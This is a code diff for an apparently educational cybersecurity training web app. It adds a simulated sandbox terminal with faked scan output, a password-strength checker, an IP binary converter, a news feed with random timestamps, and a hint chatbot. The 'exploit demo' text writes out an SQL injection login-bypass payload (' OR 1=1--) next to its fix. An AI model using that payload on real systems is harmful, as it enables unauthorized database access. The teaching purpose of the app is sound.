+  const np=$('btn-next-topic');if(np)np.onclick=()=>{S.currentTopic=ti+1;save();renderLesson();window.scrollTo(0,0)};
+  const pp=$('btn-prev-topic');if(pp)pp.onclick=()=>{S.currentTopic=ti-1;save();renderLesson();window.scrollTo(0,0)};
+  const nm=$('btn-next-mission');if(nm)nm.onclick=()=>{
+    if(S.currentMission<MISSIONS.length-1){S.currentMission++;S.currentTopic=0;save();renderLesson();window.scrollTo(0,0)}
+  };
+  const pm=$('btn-prev-mission');if(pm)pm.onclick=()=>{
+    if(S.currentMission>0){S.currentMission--;S.currentTopic=0;save();renderLesson();window.scrollTo(0,0)}
+  };
+}
+
+// Refresh task & improve difficulty
+$('btn-refresh-task').addEventListener('click',()=>{renderLesson();toast('Task refreshed!')});
+$('btn-improve-diff').addEventListener('click',()=>{
+  S.diffBoost=Math.min((S.diffBoost||0)+1,3);save();
+  toast(`Difficulty increased! Boost level: ${S.diffBoost}/3`);
+});
+
+/* ═══════════════════════════════════════════
+   TERMINAL
+   ═══════════════════════════════════════════ */
+let termHistory=[],termHI=0;
+function termWrite(t){const o=$('term-output');o.textContent+=t+'\n';if(o.textContent.length>20000)o.textContent=o.textContent.slice(-15000);o.scrollTop=o.scrollHeight}
+function termInit(){$('term-output').textContent='';termWrite('═══════════════════════════════════════\n  iHack Sandbox Terminal v2.0\n  All hosts and results are FICTIONAL.\n  Type "help" to see commands.\n═══════════════════════════════════════\n')}
+
+const TERM_CMDS={
+help:`AVAILABLE COMMANDS:
+  help            Show this help
+  whoami          Show your role
+  scope           Show authorized test scope
+  ls              List files
+  cat <file>      Read a file
+  scan target     Scan the authorized target
+  nmap target     Simulate nmap scan
+  ping target     Simulate ping
+  ifconfig        Show network config
+  whois target    Lookup domain info
+  dig target      DNS lookup
+  crack demo      Demo password cracking concept
+  exploit demo    Demo exploitation concept
+  firewall        Show firewall rules
+  report          Sample vulnerability report
+  clear           Clear terminal`,
+whoami:'Role: Ethical Hacker Trainee\nOrganization: iHack Academy\nPermission: Simulated lab.local ONLY\nClearance: Training Level',
+scope:`AUTHORIZED SCOPE DOCUMENT
+════════════════════════════
+Target:     lab.local (FICTIONAL - not a real host)
+Allowed:    Teaching commands only
+Forbidden:  Real hosts, data collection, disruption
+Duration:   This training session only
+Contact:    training@ihack.local (fictional)
+════════════════════════════`,
+ls:'scope.txt    notes.txt    config.txt    passwords.txt (encrypted)',
+'cat scope.txt':'See "scope" command for full authorization document.',
+'cat notes.txt':'DEFENDER NOTES:\n• Always verify authorization before testing\n• Document everything you find\n• Minimize access to sensitive data\n• Report findings responsibly\n• Keep your tools updated',
+'cat config.txt':'SERVER CONFIG (fictional):\nOS: Ubuntu 22.04 LTS\nWeb: Apache 2.4.52\nDB: MySQL 8.0\nFirewall: UFW (active)\nSSH: Port 22 (key-only)',
+'cat passwords.txt':'ACCESS DENIED - File is encrypted.\nNote: In real scenarios, finding a passwords file is a critical finding to report.',
+ifconfig:`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
+    inet 10.0.2.15  netmask 255.255.255.0
+    inet6 fe80::a00:27ff:fe4e:66a1/64
+    ether 08:00:27:4e:66:a1
+    RX packets 1247  TX packets 893`,
+firewall:`FIREWALL RULES (fictional):
+Chain INPUT (policy DROP)
+ALLOW    22/tcp   from 10.0.0.0/8    # SSH admin only
+ALLOW    80/tcp   from anywhere       # HTTP
+ALLOW    443/tcp  from anywhere       # HTTPS
+DROP     all      from anywhere       # Default deny`,
+report:`SAMPLE VULNERABILITY REPORT
+═══════════════════════════
+Title:      Open HTTP service on lab.local
+Severity:   Informational
+Asset:      lab.local:80 (authorized simulation)
+Finding:    HTTP service running without redirect to HTTPS
+Impact:     Data transmitted in cleartext could be intercepted
+Evidence:   Port scan showing 80/tcp open (simulated)
+Fix:        Implement HTTP→HTTPS redirect, enable HSTS
+Tested by:  ${S.user?S.user.name:'Trainee'} (authorized)
+Date:       ${new Date().toLocaleDateString()}`
+};
+
+function runTermCmd(raw){
+  const cmd=raw.trim().toLowerCase().replace(/\s+/g,' ');
+  if(!cmd)return;
+  termWrite('$ '+raw);
+  if(!S.termUsed){S.termUsed=true;save();checkBadges();addXP(20,'First terminal command')}
+
+  if(cmd==='clear'){$('term-output').textContent='';return}
+  if(TERM_CMDS[cmd]){termWrite(TERM_CMDS[cmd]);return}
+
+  if(cmd.startsWith('scan ')||cmd.startsWith('nmap ')){
+    const target=cmd.split(' ')[1];
+    if(target==='target'||target==='lab.local'){
+      termWrite(`Scanning ${target} (SIMULATED)...\n\nPORT     STATE  SERVICE     VERSION\n22/tcp   open   ssh         OpenSSH 8.9\n80/tcp   open   http        Apache 2.4.52\n443/tcp  open   https       Apache 2.4.52\n3306/tcp closed mysql       (filtered)\n\n4 ports scanned. No real network traffic generated.`);
+    } else {
+      termWrite(`ERROR: "${target}" is not in authorized scope.\nOnly "lab.local" or "target" is allowed in this simulation.`);
+    }
+    return;
+  }
+
+  if(cmd.startsWith('ping ')){
+    const target=cmd.split(' ')[1];
+    if(target==='target'||target==='lab.local'){
+      termWrite(`PING lab.local (10.0.2.100): 56 data bytes\n64 bytes: icmp_seq=0 ttl=64 time=0.5ms\n64 bytes: icmp_seq=1 ttl=64 time=0.3ms\n64 bytes: icmp_seq=2 ttl=64 time=0.4ms\n--- SIMULATED (no real packets sent) ---`);
+    } else {termWrite('Not in scope. Only lab.local/target allowed.')}
+    return;
+  }
+
+  if(cmd.startsWith('whois ')){
+    termWrite(`Domain: lab.local (FICTIONAL)\nRegistrant: iHack Academy Training\nCreated: 2024-01-01\nExpires: 2025-01-01\nNameservers: ns1.ihack.local, ns2.ihack.local\n(Simulated data)`);
+    return;
+  }
+
+  if(cmd.startsWith('dig ')){
+    termWrite(`;; SIMULATED DNS RESPONSE\nlab.local.    300  IN  A  10.0.2.100\nlab.local.    300  IN  MX 10 mail.lab.local.\n(No real DNS query performed)`);
+    return;
+  }
+
+  if(cmd==='crack demo'){
+    termWrite(`PASSWORD CRACKING CONCEPTS (educational):\n\n1. Brute Force: Try every combination (slow but thorough)\n   Time for 8-char lowercase: ~208 billion combinations\n\n2. Dictionary: Try common words and passwords\n   "password123" would be cracked instantly\n\n3. Rainbow Tables: Precomputed hash lookups\n   Defeated by salted hashing (bcrypt, argon2)\n\n4. Credential Stuffing: Try leaked password pairs\n   Defeated by unique passwords per site\n\nDEFENSE: Use password managers, long random passwords, and MFA.`);
+    return;
+  }
+
+  if(cmd==='exploit demo'){
+    termWrite(`EXPLOITATION CONCEPTS (educational):\n\nExploitation is using a vulnerability to demonstrate impact.\nIn authorized testing:\n\n1. Confirm the vulnerability exists\n2. Use minimum privilege needed\n3. Document everything\n4. Don't access unnecessary data\n5. Report findings immediately\n\nExample (conceptual):\nVuln: SQL injection in login form\nProof: ' OR 1=1-- bypasses authentication\nImpact: Unauthorized database access\nFix: Use parameterized queries\n\n⚠️ Only exploit systems with explicit authorization.`);
+    return;
+  }
+
+  if(cmd.startsWith('cat ')){termWrite(`File not found: ${cmd.split(' ').slice(1).join(' ')}\nAvailable: scope.txt, notes.txt, config.txt, passwords.txt`);return}
+
+  termWrite(`Command not found: ${cmd}\nType "help" for available commands.\n(This is a teaching simulation, not a real shell)`);
+}
+
+$('term-form').addEventListener('submit',e=>{
+  e.preventDefault();
+  const input=$('term-input');
+  const v=input.value.trim();
+  if(v){termHistory.push(v);termHI=termHistory.length;runTermCmd(v)}
+  input.value='';
+});
+$('term-input').addEventListener('keydown',e=>{
+  if(e.key==='ArrowUp'){e.preventDefault();termHI=Math.max(0,termHI-1);$('term-input').value=termHistory[termHI]||''}
+  if(e.key==='ArrowDown'){e.preventDefault();termHI=Math.min(termHistory.length,termHI+1);$('term-input').value=termHistory[termHI]||''}
+});
+
+/* ─── PASSWORD LAB ─── */
+$('pw-input').addEventListener('input',()=>{
+  const v=$('pw-input').value;
+  if(!v){$('pw-result').textContent='Waiting for input…';$('pw-result').className='text-muted';$('pw-bar').style.width='0%';$('pw-checks').innerHTML='';return}
+  const len=v.length;
+  const common=/password|qwerty|12345|letmein|admin|welcome|iloveyou|abc123/i.test(v);
+  const repeat=/(.)\1{3,}/.test(v);
+  const checks=[
+    [len>=8,'At least 8 characters'],
+    [len>=12,'At least 12 characters'],
+    [len>=16,'At least 16 characters'],
+    [/[a-z]/.test(v)&&/[A-Z]/.test(v),'Mix of upper and lowercase'],
+    [/\d/.test(v),'Contains numbers'],
+    [/[^a-zA-Z0-9]/.test(v),'Contains special characters'],
+    [!common,'No common password patterns'],
+    [!repeat,'No excessive character repetition']
+  ];
+  let score=checks.filter(([p])=>p).length;
+  if(len<8||common)score=Math.min(score,2);
+  const pct=Math.round(score/8*100);
+  const labels=['Very Weak','Weak','Fair','Good','Strong','Very Strong'];
+  const colors=['var(--red)','var(--red)','var(--orange)','var(--yellow)','var(--green)','var(--green)'];
+  const li=Math.min(Math.floor(score/1.5),5);
+  $('pw-bar').style.width=pct+'%';
+  $('pw-bar').style.background=colors[li];
+  $('pw-result').textContent=labels[li];
+  $('pw-result').style.color=colors[li];
+  $('pw-checks').innerHTML=checks.map(([p,t])=>`<li style="color:${p?'var(--green)':'var(--muted)'};margin:4px 0">${p?'✓':'○'} ${t}</li>`).join('');
+});
+
+/* ─── BINARY IP LAB ─── */
+$('btn-ip-to-bin').addEventListener('click',()=>{
+  const v=$('ip-decimal').value.trim();
+  const parts=v.split('.').map(Number);
+  if(parts.length!==4||parts.some(p=>isNaN(p)||p<0||p>255)){toast('Invalid IP address',true);return}
+  const bin=parts.map(p=>p.toString(2).padStart(8,'0')).join('.');
+  $('ip-bin-result').classList.remove('hidden');
+  $('ip-bin-result').innerHTML=`<strong>Decimal:</strong> <code>${esc(v)}</code><br><strong>Binary:</strong> <code>${bin}</code><br><br><strong>Breakdown:</strong><br>${parts.map((p,i)=>`${p} = ${p.toString(2).padStart(8,'0')} (${[128,64,32,16,8,4,2,1].filter((_,bi)=>(p>>>(7-bi))&1).join('+')||'0'})`).join('<br>')}`;
+  if(!S.binaryUsed){S.binaryUsed=true;save();checkBadges();addXP(15,'First binary conversion')}
+});
+$('btn-bin-to-ip').addEventListener('click',()=>{
+  const v=$('ip-binary').value.trim();
+  const parts=v.split('.');
+  if(parts.length!==4||parts.some(p=>!/^[01]{1,8}$/.test(p))){toast('Invalid binary IP',true);return}
+  const dec=parts.map(p=>parseInt(p,2)).join('.');
+  $('bin-ip-result').classList.remove('hidden');
+  $('bin-ip-result').innerHTML=`<strong>Binary:</strong> <code>${esc(v)}</code><br><strong>Decimal:</strong> <code>${dec}</code>`;
+});
+
+/* ═══════════════════════════════════════════
+   NEWS PAGE
+   ═══════════════════════════════════════════ */
+function renderNews(){
+  const today=new Date();
+  const dayOfYear=Math.floor((today-new Date(today.getFullYear(),0,0))/(1000*60*60*24));
+  $('news-date').textContent=today.toLocaleDateString('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'});
+
+  // Rotate news based on day
+  const shuffled=[...NEWS_POOL];
+  for(let i=shuffled.length-1;i>0;i--){const j=(dayOfYear*7+i)%shuffled.length;[shuffled[i],shuffled[j]]=[shuffled[j],shuffled[i]]}
+  const todayNews=shuffled.slice(0,6);
+
+  $('news-grid').innerHTML=todayNews.map((n,i)=>{
+    const sevColor=n.severity==='critical'?'red':n.severity==='high'?'orange':'yellow';
+    const fakeHoursAgo=Math.floor(Math.random()*23)+1;
+    return`<div class="card news-card">
+      <div class="nc-date">📅 ${fakeHoursAgo}h ago · <span class="chip chip-${sevColor}">${n.severity.toUpperCase()}</span></div>
+      <h3>${n.title}</h3>
+      <p>${n.body}</p>
+      <div class="nc-tags">${n.tags.map(t=>`<span class="chip chip-blue">${t}</span>`).join('')}</div>
+    </div>`;
+  }).join('');
+}
+
+/* ═══════════════════════════════════════════
+   PROFILE PAGE
+   ═══════════════════════════════════════════ */
+function renderProfile(){
+  if(!S.user)return;
+  $('profile-avatar').textContent=S.user.name.charAt(0).toUpperCase();
+  $('profile-name').textContent=S.user.name;
+  $('profile-meta').textContent=`${S.user.level.charAt(0).toUpperCase()+S.user.level.slice(1)} · Age: ${S.user.age} · Joined: ${new Date(S.user.joined).toLocaleDateString()}`;
+  $('profile-rank').textContent=getRank();
+  $('profile-rank').className=`chip chip-${getRank()==='Cyber Guardian'?'yellow':getRank()==='Sentinel'?'purple':getRank()==='Defender'?'blue':'green'}`;
+
+  $('profile-stats').innerHTML=[
+    ['Total XP',S.xp,'green'],
+    ['Level',getLevel(),'cyan'],
+    ['Missions Done',completedCount()+'/'+MISSIONS.length,'blue'],
+    ['Quizzes Solved',Object.keys(S.solved).length,'purple'],
+    ['Badges',S.badges.length+'/'+BADGE_DEFS.length,'yellow'],
+    ['Rank',getRank(),'green']
+  ].map(([l,v,c])=>`<div class="stat-card"><div class="stat-value" style="background:linear-gradient(135deg,var(--${c}),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">${v}</div><div class="stat-label">${l}</div></div>`).join('');
+
+  $('profile-badges').innerHTML=BADGE_DEFS.map(b=>{
+    const earned=S.badges.includes(b.id);
+    return`<div class="badge-item ${earned?'earned':''}">${earned?'✓':'🔒'} ${b.name} — ${b.desc}</div>`;
+  }).join('');
+
+  $('activity-log').innerHTML=S.actions.length
+    ?`<div style="max-height:300px;overflow-y:auto">${S.actions.slice(0,20).map(a=>`<div style="padding:8px 0;border-bottom:1px solid var(--border);font-size:.85rem"><span class="text-muted">${new Date(a.t).toLocaleString()}</span> — ${esc(a.msg)}</div>`).join('')}</div>`
+    :'<p class="text-muted">No activities yet.</p>';
+}
+
+$('btn-reset').addEventListener('click',()=>{
+  if(!confirm('Reset ALL progress? This cannot be undone.'))return;
+  localStorage.removeItem(STORAGE_KEY);
+  S=freshState();
+  toast('Progress reset. Returning to login…');
+  setTimeout(()=>location.reload(),1000);
+});
+
+/* ═══════════════════════════════════════════
+   AI BOT
+   ═══════════════════════════════════════════ */
+let botOpen=false;
+$('bot-toggle').addEventListener('click',()=>{botOpen=!botOpen;$('bot-panel').classList.toggle('hidden',!botOpen);if(botOpen&&$('bot-messages').children.length===0)botMsg('bot',"Hi! I'm CyberBot 🤖\n\nI help you learn — I won't give direct answers, but I'll guide you with hints and explanations.\n\nTry asking:\n• What is phishing?\n• How does encryption work?\n• Help me with the quiz\n• What is SQL injection?\n• Explain IP classes")});
+$('bot-close').addEventListener('click',()=>{botOpen=false;$('bot-panel').classList.add('hidden')});
+
+function botMsg(type,text){
+  const d=document.createElement('div');
+  d.className=`bot-msg ${type}`;
+  d.textContent=text;
+  $('bot-messages').appendChild(d);
+  $('bot-messages').scrollTop=$('bot-messages').scrollHeight;
+}
+
+const BOT_KB=[
+  {k:['hello','hi','hey','sup'],r:"Hello, defender! 👋 Ask me anything about cybersecurity. I'll give hints, not direct answers — that way you learn better!"},
+  {k:['phishing','phish'],r:"🎣 Phishing is when attackers send deceptive messages to trick you into revealing information or clicking malicious links.\n\nHint: Look for urgency, suspicious sender addresses, and requests for credentials. Always verify through a trusted channel!"},
+  {k:['sql injection','sqli','sql'],r:"🧩 SQL Injection happens when untrusted input changes a database query's meaning.\n\nHint: The fix involves keeping data separate from code structure. Think about 'parameterized' approaches!"},
+  {k:['xss','cross-site scripting','cross site'],r:"🧩 XSS allows attacker-controlled content to run as code in someone's browser.\n\nHint: The defense involves properly encoding output based on context. Never trust user input!"},
+  {k:['password','passwords'],r:"🔑 Strong passwords are long, unique, and random.\n\nHint: Think about what tool can generate and remember unique passwords for every account. And what adds a second layer beyond passwords?"},
+  {k:['encryption','encrypt','decrypt'],r:"🔐 Encryption uses keys to protect data confidentiality.\n\nHint: There are two main types — one uses the same key for both operations, the other uses a pair of keys. Can you name them?"},
+  {k:['hash','hashing'],r:"🔐 Hashing creates a fixed-size fingerprint of data. It's one-way — you can't reverse it.\n\nHint: For passwords, you need a SLOW hashing function with a unique addition to each password. What are these called?"},
+  {k:['network','networking','ip','address'],r:"🌐 Networks connect devices to share resources. IP addresses identify devices on a network.\n\nHint: IPv4 uses 32 bits divided into 4 octets. Can you figure out which class 172.16.0.1 belongs to?"},
+  {k:['topology','topologies'],r:"🌐 Network topology is how devices are arranged and connected.\n\nHint: Think about shapes — star, ring, bus, mesh. Which one has a central point everything connects to?"},
+  {k:['kali','linux','command'],r:"🐉 Kali Linux is a security-focused OS with pre-installed tools.\n\nHint: Start with basic commands — how do you list files? Show your current directory? Remember: tools must only be used on authorized targets!"},
+  {k:['cisco','packet tracer'],r:"📡 Cisco Packet Tracer lets you simulate networks safely.\n\nHint: You can drag devices, connect them with cables, and configure them using CLI commands. Start by setting IP addresses on PCs!"},
+  {k:['quiz','help','answer','hint','stuck'],r:"🧠 I won't give you the direct answer — that's how you learn!\n\nHere's my approach:\n1. Re-read the lesson material above\n2. Think about the key concept being tested\n3. Eliminate obviously wrong answers\n4. Look for the hint I provide when you get one wrong\n\nYou've got this! 💪"},
+  {k:['cia','triad','confidentiality','integrity','availability'],r:"🛡️ The CIA Triad is fundamental!\n\nHint: Think about three questions:\n• Who can see this data? (C____)\n• Has this data been tampered with? (I____)\n• Can authorized users access it when needed? (A____)\n\nCan you fill in the blanks?"},
+  {k:['malware','virus','trojan','ransomware','worm'],r:"🦠 Malware is malicious software with many forms.\n\nHint: Each type has a unique behavior — one encrypts files for ransom, one disguises as legitimate software, one spreads by itself without user action. Which is which?"},
+  {k:['firewall','firewalls'],r:"🧱 Firewalls control what traffic is allowed in and out.\n\nHint: They work on rules — like a bouncer at a club. Some check only addresses (packet-filtering), others track conversations (stateful), and advanced ones inspect content (application-layer)."},
+  {k:['mfa','two factor','2fa','authentication'],r:"🔑 MFA adds layers beyond just a password.\n\nHint: The three factor types are something you KNOW, something you HAVE, and something you ARE. Two passwords are NOT two factors — why not?"},
+  {k:['binary','convert','decimal'],r:"🔢 Binary conversion is key for understanding IP addresses!\n\nHint: Each position doubles — from right: 1, 2, 4, 8, 16, 32, 64, 128. Add the positions where there's a '1'. Try it with 11000000!"},
+  {k:['incident','response','breach'],r:"🚨 Incident response follows a structured process.\n\nHint: Think Prepare → Detect → Contain → Eradicate → Recover → Learn. What's the FIRST thing you should do when you suspect a breach? (Hint: it's NOT deleting files!)"},
+  {k:['pentest','penetration','testing'],r:"⚔️ Penetration testing follows 5 phases.\n\nHint: Before you can exploit anything, you need to gather information first. What's that phase called? And what MUST you have before starting ANY phase?"},
+  {k:['osint','reconnaissance','recon'],r:"🔍 Reconnaissance is the information-gathering phase.\n\nHint: There are two types — one where you don't interact with the target directly (passive), and one where you do (active). Even passive recon should be within your authorized scope!"},
+  {k:['ethics','ethical','legal','permission'],r:"⚖️ Ethics is the foundation of everything we do!\n\nHint: The #1 rule is simple: GET PERMISSION. Without authorization, even well-intentioned testing is potentially illegal. Always define scope before testing."},
+];
+
+function botRespond(input){
+  const lower=input.toLowerCase();
+  for(const entry of BOT_KB){
+    if(entry.k.some(k=>lower.includes(k)))return entry.r;
+  }
+  return"🤔 I'm not sure about that specific topic yet, but here's what I can help with:\n\n• Cybersecurity concepts (CIA triad, threats, etc.)\n• Network basics (IP, DNS, topologies)\n• Web security (SQL injection, XSS)\n• Tools (Kali Linux, Cisco Packet Tracer)\n• Encryption & hashing\n• Quiz hints (I guide, not give answers!)\n\nTry asking about one of these topics!";
+}
+
+function sendBotMessage(){
+  const input=$('bot-input').value.trim();
+  if(!input)return;
+  botMsg('user',input);
+  $('bot-input').value='';
+  setTimeout(()=>botMsg('bot',botRespond(input)),400+Math.random()*600);
+}
+
+$('bot-send').addEventListener('click',sendBotMessage);
+$('bot-input').addEventListener('keydown',e=>{if(e.key==='Enter')sendBotMessage()});
+
+/* ═══════════════════════════════════════════
+   INIT
+   ═══════════════════════════════════════════ */
+setupSecurityLock();
+termInit();
+if(load()&&S.user){
+  enterApp();
+  lockAcademy('startup');
+} else {
+  $('page-auth').classList.remove('hidden');
+}
+
+</script>
+</body>
+</html>
